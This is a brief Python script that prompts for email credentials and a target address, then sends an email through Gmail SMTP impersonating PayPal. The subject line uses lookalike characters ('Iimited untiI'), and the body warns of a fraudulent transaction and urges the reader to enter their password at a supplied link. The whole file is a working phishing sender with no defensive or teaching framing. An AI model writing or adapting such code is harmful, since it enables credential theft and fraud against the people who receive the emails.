import smtplib, ssl
import getpass
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


def send(url):
    sender_email = input("Email: ")
    receiver_email = input("Receiver Email: ")
    password = getpass.getpass("Type your password and press enter:")

    message = MIMEMultipart("alternative")
    message["Subject"] = "Your account has been Iimited untiI we hear from you!"
    message["From"] = sender_email
    message["To"] = receiver_email

    # Create the plain-text and HTML version of your message
    text = f"We call you from PayPal to inform you of a possible fraudulent transaction on your account. Enter your password now to hear the details of the transaction. We need your immediate action to be able to block this transaction. \n{url}"

    # Turn these into plain/html MIMEText objects
    part = MIMEText(text, "plain")

    # Add HTML/plain-text parts to MIMEMultipart message
    # The email client will try to render the last part first
    message.attach(part)
    # Create secure connection with server and send email
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(
            sender_email, receiver_email, message.as_string()
        )
